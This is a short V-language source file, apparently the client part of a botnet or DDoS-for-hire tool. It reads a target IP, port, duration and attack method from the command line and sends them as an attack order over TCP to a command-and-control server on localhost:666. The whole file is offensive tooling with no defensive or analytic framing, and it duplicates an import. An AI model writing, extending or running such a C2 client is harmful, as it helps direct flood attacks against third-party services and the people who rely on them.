module attack_system
import net
import io
import os
import net

struct Attackc2 {
    pub mut:
        ips string
        ports string
        times string
        methods string
}

fn rawattack() {
  ip := Attackc2{ ips: os.args[1]}
  port := Attackc2{ ports: os.args[2]}
  time := Attackc2{ times: os.args[3]}
  method := Attackc2{ methods: os.args[4]}
  mut conn := net.dial_tcp("localhost:666") or {panic("C2 IS DOWN!!!")} 
  conn.write_string("$ip.ips $port.ports $time.times $method.methods") or {0}
  println("sent!!!")
}   